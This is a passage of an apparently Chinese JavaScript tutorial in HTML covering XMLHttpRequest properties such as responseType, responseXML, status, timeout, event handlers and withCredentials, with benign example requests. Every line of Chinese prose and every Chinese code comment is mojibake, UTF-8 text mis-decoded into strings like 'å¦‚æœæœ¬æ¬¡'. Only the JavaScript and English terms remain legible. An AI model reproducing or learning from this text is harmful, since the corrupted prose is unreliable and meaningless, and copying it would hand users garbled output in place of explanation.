<p>å¦‚æœæœ¬æ¬¡è¯·æ±‚æ²¡æœ‰æˆåŠŸæˆ–è€…æ•°æ®ä¸å®Œæ•´ï¼Œè¯¥å±æ€§ç­‰äº<code>null</code>ã€‚ä½†æ˜¯ï¼Œå¦‚æœ<code>responseType</code>å±æ€§ç­‰äº<code>text</code>æˆ–ç©ºå­—ç¬¦ä¸²ï¼Œåœ¨è¯·æ±‚æ²¡æœ‰ç»“æŸä¹‹å‰ï¼ˆ<code>readyState</code>ç­‰äº3çš„é˜¶æ®µï¼‰ï¼Œ<code>response</code>å±æ€§åŒ…å«æœåŠ¡å™¨å·²ç»è¿”å›çš„éƒ¨åˆ†æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    handler(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseType"><a href="#XMLHttpRequest-responseType" class="headerlink" title="XMLHttpRequest.responseType"></a>XMLHttpRequest.responseType</h4><p><code>XMLHttpRequest.responseType</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ•°æ®çš„ç±»å‹ã€‚è¿™ä¸ªå±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨<code>open()</code>æ–¹æ³•ä¹‹åã€è°ƒç”¨<code>send()</code>æ–¹æ³•ä¹‹å‰ï¼Œè®¾ç½®è¿™ä¸ªå±æ€§çš„å€¼ï¼Œå‘Šè¯‰æµè§ˆå™¨å¦‚ä½•è§£è¯»è¿”å›çš„æ•°æ®ã€‚å¦‚æœ<code>responseType</code>è®¾ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå°±ç­‰åŒäºé»˜è®¤å€¼<code>text</code>ã€‚</p>
<p><code>XMLHttpRequest.responseType</code>å±æ€§å¯ä»¥ç­‰äºä»¥ä¸‹å€¼ã€‚</p>
<ul>
<li>â€œâ€ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ï¼šç­‰åŒäº<code>text</code>ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ–‡æœ¬æ•°æ®ã€‚</li>
<li>â€œarraybufferâ€ï¼šArrayBuffer å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›äºŒè¿›åˆ¶æ•°ç»„ã€‚</li>
<li>â€œblobâ€ï¼šBlob å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›äºŒè¿›åˆ¶å¯¹è±¡ã€‚</li>
<li>â€œdocumentâ€ï¼šDocument å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›ä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ã€‚</li>
<li>â€œjsonâ€ï¼šJSON å¯¹è±¡ã€‚</li>
<li>â€œtextâ€ï¼šå­—ç¬¦ä¸²ã€‚</li>
</ul>
<p>ä¸Šé¢å‡ ç§ç±»å‹ä¹‹ä¸­ï¼Œ<code>text</code>ç±»å‹é€‚åˆå¤§å¤šæ•°æƒ…å†µï¼Œè€Œä¸”ç›´æ¥å¤„ç†æ–‡æœ¬ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚<code>document</code>ç±»å‹é€‚åˆè¿”å› HTML &#x2F; XML æ–‡æ¡£çš„æƒ…å†µï¼Œè¿™æ„å‘³ç€ï¼Œå¯¹äºé‚£äº›æ‰“å¼€ CORS çš„ç½‘ç«™ï¼Œå¯ä»¥ç›´æ¥ç”¨ Ajax æŠ“å–ç½‘é¡µï¼Œç„¶åä¸ç”¨è§£æ HTML å­—ç¬¦ä¸²ï¼Œç›´æ¥å¯¹æŠ“å–å›æ¥çš„æ•°æ®è¿›è¡Œ DOM æ“ä½œã€‚<code>blob</code>ç±»å‹é€‚åˆè¯»å–äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚å›¾ç‰‡æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;path&#x2F;to&#x2F;image.png&#39;, true);</span><br><span class="line">xhr.responseType &#x3D; &#39;blob&#39;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  if (this.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    var blob &#x3D; new Blob([xhr.response], &#123;type: &#39;image&#x2F;png&#39;&#125;);</span><br><span class="line">    &#x2F;&#x2F; æˆ–è€…</span><br><span class="line">    var blob &#x3D; xhr.response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå°†è¿™ä¸ªå±æ€§è®¾ä¸º<code>ArrayBuffer</code>ï¼Œå°±å¯ä»¥æŒ‰ç…§æ•°ç»„çš„æ–¹å¼å¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;path&#x2F;to&#x2F;image.png&#39;, true);</span><br><span class="line">xhr.responseType &#x3D; &#39;arraybuffer&#39;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  var uInt8Array &#x3D; new Uint8Array(this.response);</span><br><span class="line">  for (var i &#x3D; 0, len &#x3D; uInt8Array.length; i &lt; len; ++i) &#123;</span><br><span class="line">    &#x2F;&#x2F; var byte &#x3D; uInt8Array[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå°†è¿™ä¸ªå±æ€§è®¾ä¸º<code>json</code>ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨å¯¹è¿”å›æ•°æ®è°ƒç”¨<code>JSON.parse()</code>æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»<code>xhr.response</code>å±æ€§ï¼ˆæ³¨æ„ï¼Œä¸æ˜¯<code>xhr.responseText</code>å±æ€§ï¼‰å¾—åˆ°çš„ä¸æ˜¯æ–‡æœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ã€‚</p>
<h4 id="XMLHttpRequest-responseText"><a href="#XMLHttpRequest-responseText" class="headerlink" title="XMLHttpRequest.responseText"></a>XMLHttpRequest.responseText</h4><p><code>XMLHttpRequest.responseText</code>å±æ€§è¿”å›ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ï¼Œè¯¥å±æ€§ä¸ºåªè¯»ã€‚åªæœ‰ HTTP è¯·æ±‚å®Œæˆæ¥æ”¶ä»¥åï¼Œè¯¥å±æ€§æ‰ä¼šåŒ…å«å®Œæ•´çš„æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.responseType &#x3D; &#39;text&#39;;</span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(xhr.responseText);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseXML"><a href="#XMLHttpRequest-responseXML" class="headerlink" title="XMLHttpRequest.responseXML"></a>XMLHttpRequest.responseXML</h4><p><code>XMLHttpRequest.responseXML</code>å±æ€§è¿”å›ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ HTML æˆ– XML æ–‡æ¡£å¯¹è±¡ï¼Œè¯¥å±æ€§ä¸ºåªè¯»ã€‚å¦‚æœæœ¬æ¬¡è¯·æ±‚æ²¡æœ‰æˆåŠŸï¼Œæˆ–è€…æ”¶åˆ°çš„æ•°æ®ä¸èƒ½è¢«è§£æä¸º XML æˆ– HTMLï¼Œè¯¥å±æ€§ç­‰äº<code>null</code>ã€‚</p>
<p>è¯¥å±æ€§ç”Ÿæ•ˆçš„å‰ææ˜¯ HTTP å›åº”çš„<code>Content-Type</code>å¤´ä¿¡æ¯ç­‰äº<code>text/xml</code>æˆ–<code>application/xml</code>ã€‚è¿™è¦æ±‚åœ¨å‘é€è¯·æ±‚å‰ï¼Œ<code>XMLHttpRequest.responseType</code>å±æ€§è¦è®¾ä¸º<code>document</code>ã€‚å¦‚æœ HTTP å›åº”çš„<code>Content-Type</code>å¤´ä¿¡æ¯ä¸ç­‰äº<code>text/xml</code>å’Œ<code>application/xml</code>ï¼Œä½†æ˜¯æƒ³ä»<code>responseXML</code>æ‹¿åˆ°æ•°æ®ï¼ˆå³æŠŠæ•°æ®æŒ‰ç…§ DOM æ ¼å¼è§£æï¼‰ï¼Œé‚£ä¹ˆéœ€è¦æ‰‹åŠ¨è°ƒç”¨<code>XMLHttpRequest.overrideMimeType()</code>æ–¹æ³•ï¼Œå¼ºåˆ¶è¿›è¡Œ XML è§£æã€‚</p>
<p>è¯¥å±æ€§å¾—åˆ°çš„æ•°æ®ï¼Œæ˜¯ç›´æ¥è§£æåçš„æ–‡æ¡£ DOM æ ‘ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.responseType &#x3D; &#39;document&#39;;</span><br><span class="line">xhr.overrideMimeType(&#39;text&#x2F;xml&#39;);</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(xhr.responseXML);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseURL"><a href="#XMLHttpRequest-responseURL" class="headerlink" title="XMLHttpRequest.responseURL"></a>XMLHttpRequest.responseURL</h4><p><code>XMLHttpRequest.responseURL</code>å±æ€§æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå‘é€æ•°æ®çš„æœåŠ¡å™¨çš„ç½‘å€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;test&#39;, true);</span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  &#x2F;&#x2F; è¿”å› http:&#x2F;&#x2F;example.com&#x2F;test</span><br><span class="line">  console.log(xhr.responseURL);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§çš„å€¼ä¸<code>open()</code>æ–¹æ³•æŒ‡å®šçš„è¯·æ±‚ç½‘å€ä¸ä¸€å®šç›¸åŒã€‚å¦‚æœæœåŠ¡å™¨ç«¯å‘ç”Ÿè·³è½¬ï¼Œè¿™ä¸ªå±æ€§è¿”å›æœ€åå®é™…è¿”å›æ•°æ®çš„ç½‘å€ã€‚å¦å¤–ï¼Œå¦‚æœåŸå§‹ URL åŒ…æ‹¬é”šç‚¹ï¼ˆfragmentï¼‰ï¼Œè¯¥å±æ€§ä¼šæŠŠé”šç‚¹å‰¥ç¦»ã€‚</p>
<h4 id="XMLHttpRequest-statusï¼ŒXMLHttpRequest-statusText"><a href="#XMLHttpRequest-statusï¼ŒXMLHttpRequest-statusText" class="headerlink" title="XMLHttpRequest.statusï¼ŒXMLHttpRequest.statusText"></a>XMLHttpRequest.statusï¼ŒXMLHttpRequest.statusText</h4><p><code>XMLHttpRequest.status</code>å±æ€§è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å›åº”çš„ HTTP çŠ¶æ€ç ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœé€šä¿¡æˆåŠŸçš„è¯ï¼Œè¿™ä¸ªçŠ¶æ€ç æ˜¯200ï¼›å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›çŠ¶æ€ç ï¼Œé‚£ä¹ˆè¿™ä¸ªå±æ€§é»˜è®¤æ˜¯200ã€‚è¯·æ±‚å‘å‡ºä¹‹å‰ï¼Œè¯¥å±æ€§ä¸º<code>0</code>ã€‚è¯¥å±æ€§åªè¯»ã€‚</p>
<ul>
<li>200, OKï¼Œè®¿é—®æ­£å¸¸</li>
<li>301, Moved Permanentlyï¼Œæ°¸ä¹…ç§»åŠ¨</li>
<li>302, Moved temporarilyï¼Œæš‚æ—¶ç§»åŠ¨</li>
<li>304, Not Modifiedï¼Œæœªä¿®æ”¹</li>
<li>307, Temporary Redirectï¼Œæš‚æ—¶é‡å®šå‘</li>
<li>401, Unauthorizedï¼Œæœªæˆæƒ</li>
<li>403, Forbiddenï¼Œç¦æ­¢è®¿é—®</li>
<li>404, Not Foundï¼Œæœªå‘ç°æŒ‡å®šç½‘å€</li>
<li>500, Internal Server Errorï¼ŒæœåŠ¡å™¨å‘ç”Ÿé”™è¯¯</li>
</ul>
<p>åŸºæœ¬ä¸Šï¼Œåªæœ‰2xxå’Œ304çš„çŠ¶æ€ç ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ˜¯æ­£å¸¸çŠ¶æ€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">  if ( (xhr.status &gt;&#x3D; 200 &amp;&amp; xhr.status &lt; 300)</span><br><span class="line">    || (xhr.status &#x3D;&#x3D;&#x3D; 304) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; å¤„ç†æœåŠ¡å™¨çš„è¿”å›æ•°æ®</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; å‡ºé”™</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XMLHttpRequest.statusText</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å‘é€çš„çŠ¶æ€æç¤ºã€‚ä¸åŒäº<code>status</code>å±æ€§ï¼Œè¯¥å±æ€§åŒ…å«æ•´ä¸ªçŠ¶æ€ä¿¡æ¯ï¼Œæ¯”å¦‚â€œOKâ€å’Œâ€œNot Foundâ€ã€‚åœ¨è¯·æ±‚å‘é€ä¹‹å‰ï¼ˆå³è°ƒç”¨<code>open()</code>æ–¹æ³•ä¹‹å‰ï¼‰ï¼Œè¯¥å±æ€§çš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ï¼›å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›çŠ¶æ€æç¤ºï¼Œè¯¥å±æ€§çš„å€¼é»˜è®¤ä¸ºâ€œOKâ€ã€‚è¯¥å±æ€§ä¸ºåªè¯»å±æ€§ã€‚</p>
<h4 id="XMLHttpRequest-timeoutï¼ŒXMLHttpRequestEventTarget-ontimeout"><a href="#XMLHttpRequest-timeoutï¼ŒXMLHttpRequestEventTarget-ontimeout" class="headerlink" title="XMLHttpRequest.timeoutï¼ŒXMLHttpRequestEventTarget.ontimeout"></a>XMLHttpRequest.timeoutï¼ŒXMLHttpRequestEventTarget.ontimeout</h4><p><code>XMLHttpRequest.timeout</code>å±æ€§è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¤šå°‘æ¯«ç§’åï¼Œå¦‚æœè¯·æ±‚ä»ç„¶æ²¡æœ‰å¾—åˆ°ç»“æœï¼Œå°±ä¼šè‡ªåŠ¨ç»ˆæ­¢ã€‚å¦‚æœè¯¥å±æ€§ç­‰äº0ï¼Œå°±è¡¨ç¤ºæ²¡æœ‰æ—¶é—´é™åˆ¶ã€‚</p>
<p><code>XMLHttpRequestEventTarget.ontimeout</code>å±æ€§ç”¨äºè®¾ç½®ä¸€ä¸ªç›‘å¬å‡½æ•°ï¼Œå¦‚æœå‘ç”Ÿ timeout äº‹ä»¶ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªç›‘å¬å‡½æ•°ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">var url &#x3D; &#39;&#x2F;server&#39;;</span><br><span class="line"></span><br><span class="line">xhr.ontimeout &#x3D; function () &#123;</span><br><span class="line">  console.error(&#39;The request for &#39; + url + &#39; timed out.&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function() &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    if (xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">      &#x2F;&#x2F; å¤„ç†æœåŠ¡å™¨è¿”å›çš„æ•°æ®</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;GET&#39;, url, true);</span><br><span class="line">&#x2F;&#x2F; æŒ‡å®š 10 ç§’é’Ÿè¶…æ—¶</span><br><span class="line">xhr.timeout &#x3D; 10 * 1000;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="äº‹ä»¶ç›‘å¬å±æ€§"><a href="#äº‹ä»¶ç›‘å¬å±æ€§" class="headerlink" title="äº‹ä»¶ç›‘å¬å±æ€§"></a>äº‹ä»¶ç›‘å¬å±æ€§</h4><p>XMLHttpRequest å¯¹è±¡å¯ä»¥å¯¹ä»¥ä¸‹äº‹ä»¶æŒ‡å®šç›‘å¬å‡½æ•°ã€‚</p>
<ul>
<li>XMLHttpRequest.onloadstartï¼šloadstart äº‹ä»¶ï¼ˆHTTP è¯·æ±‚å‘å‡ºï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.onprogressï¼šprogressäº‹ä»¶ï¼ˆæ­£åœ¨å‘é€å’ŒåŠ è½½æ•°æ®ï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.onabortï¼šabort äº‹ä»¶ï¼ˆè¯·æ±‚ä¸­æ­¢ï¼Œæ¯”å¦‚ç”¨æˆ·è°ƒç”¨äº†<code>abort()</code>æ–¹æ³•ï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.onerrorï¼šerror äº‹ä»¶ï¼ˆè¯·æ±‚å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.onloadï¼šload äº‹ä»¶ï¼ˆè¯·æ±‚æˆåŠŸå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.ontimeoutï¼štimeout äº‹ä»¶ï¼ˆç”¨æˆ·æŒ‡å®šçš„æ—¶é™è¶…è¿‡äº†ï¼Œè¯·æ±‚è¿˜æœªå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°</li>
<li>XMLHttpRequest.onloadendï¼šloadend äº‹ä»¶ï¼ˆè¯·æ±‚å®Œæˆï¼Œä¸ç®¡æˆåŠŸæˆ–å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">xhr.onload &#x3D; function() &#123;</span><br><span class="line"> var responseText &#x3D; xhr.responseText;</span><br><span class="line"> console.log(responseText);</span><br><span class="line"> &#x2F;&#x2F; process the response.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onabort &#x3D; function () &#123;</span><br><span class="line">  console.log(&#39;The request was aborted&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onprogress &#x3D; function (event) &#123;</span><br><span class="line">  console.log(event.loaded);</span><br><span class="line">  console.log(event.total);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror &#x3D; function() &#123;</span><br><span class="line">  console.log(&#39;There was an error!&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°æœ‰ä¸€ä¸ªäº‹ä»¶å¯¹è±¡å‚æ•°ï¼Œè¯¥å¯¹è±¡æœ‰ä¸‰ä¸ªå±æ€§ï¼š<code>loaded</code>å±æ€§è¿”å›å·²ç»ä¼ è¾“çš„æ•°æ®é‡ï¼Œ<code>total</code>å±æ€§è¿”å›æ€»çš„æ•°æ®é‡ï¼Œ<code>lengthComputable</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåŠ è½½çš„è¿›åº¦æ˜¯å¦å¯ä»¥è®¡ç®—ã€‚æ‰€æœ‰è¿™äº›ç›‘å¬å‡½æ•°é‡Œé¢ï¼Œåªæœ‰<code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°æœ‰å‚æ•°ï¼Œå…¶ä»–å‡½æ•°éƒ½æ²¡æœ‰å‚æ•°ã€‚</p>
<p>æ³¨æ„ï¼Œå¦‚æœå‘ç”Ÿç½‘ç»œé”™è¯¯ï¼ˆæ¯”å¦‚æœåŠ¡å™¨æ— æ³•è¿é€šï¼‰ï¼Œ<code>onerror</code>äº‹ä»¶æ— æ³•è·å–æŠ¥é”™ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯èƒ½æ²¡æœ‰é”™è¯¯å¯¹è±¡ï¼Œæ‰€ä»¥è¿™æ ·åªèƒ½æ˜¾ç¤ºæŠ¥é”™çš„æç¤ºã€‚</p>
<h4 id="XMLHttpRequest-withCredentials"><a href="#XMLHttpRequest-withCredentials" class="headerlink" title="XMLHttpRequest.withCredentials"></a>XMLHttpRequest.withCredentials</h4><p><code>XMLHttpRequest.withCredentials</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè·¨åŸŸè¯·æ±‚æ—¶ï¼Œç”¨æˆ·ä¿¡æ¯ï¼ˆæ¯”å¦‚ Cookie å’Œè®¤è¯çš„ HTTP å¤´ä¿¡æ¯ï¼‰æ˜¯å¦ä¼šåŒ…å«åœ¨è¯·æ±‚ä¹‹ä¸­ï¼Œé»˜è®¤ä¸º<code>false</code>ï¼Œå³å‘<code>example.com</code>å‘å‡ºè·¨åŸŸè¯·æ±‚æ—¶ï¼Œä¸ä¼šå‘é€<code>example.com</code>è®¾ç½®åœ¨æœ¬æœºä¸Šçš„ Cookieï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚</p>
<p>å¦‚æœéœ€è¦è·¨åŸŸ AJAX è¯·æ±‚å‘é€ Cookieï¼Œéœ€è¦<code>withCredentials</code>å±æ€§è®¾ä¸º<code>true</code>ã€‚æ³¨æ„ï¼ŒåŒæºçš„è¯·æ±‚ä¸éœ€è¦è®¾ç½®è¿™ä¸ªå±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;&#39;, true);</span><br><span class="line">xhr.withCredentials &#x3D; true;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†è®©è¿™ä¸ªå±æ€§ç”Ÿæ•ˆï¼ŒæœåŠ¡å™¨å¿…é¡»æ˜¾å¼è¿”å›<code>Access-Control-Allow-Credentials</code>è¿™ä¸ªå¤´ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p><code>withCredentials</code>å±æ€§æ‰“å¼€çš„è¯ï¼Œè·¨åŸŸè¯·æ±‚ä¸ä»…ä¼šå‘é€ Cookieï¼Œè¿˜ä¼šè®¾ç½®è¿œç¨‹ä¸»æœºæŒ‡å®šçš„ Cookieã€‚åä¹‹ä¹Ÿæˆç«‹ï¼Œå¦‚æœ<code>withCredentials</code>å±æ€§æ²¡æœ‰æ‰“å¼€ï¼Œé‚£ä¹ˆè·¨åŸŸçš„ AJAX è¯·æ±‚å³ä½¿æ˜ç¡®è¦æ±‚æµè§ˆå™¨è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¼šå¿½ç•¥ã€‚</p>
<p>æ³¨æ„ï¼Œè„šæœ¬æ€»æ˜¯éµå®ˆåŒæºæ”¿ç­–ï¼Œæ— æ³•ä»<code>document.cookie</code>æˆ–è€… HTTP å›åº”çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œè¯»å–è·¨åŸŸçš„ Cookieï¼Œ<code>withCredentials</code>å±æ€§ä¸å½±å“è¿™ä¸€ç‚¹ã€‚</p>
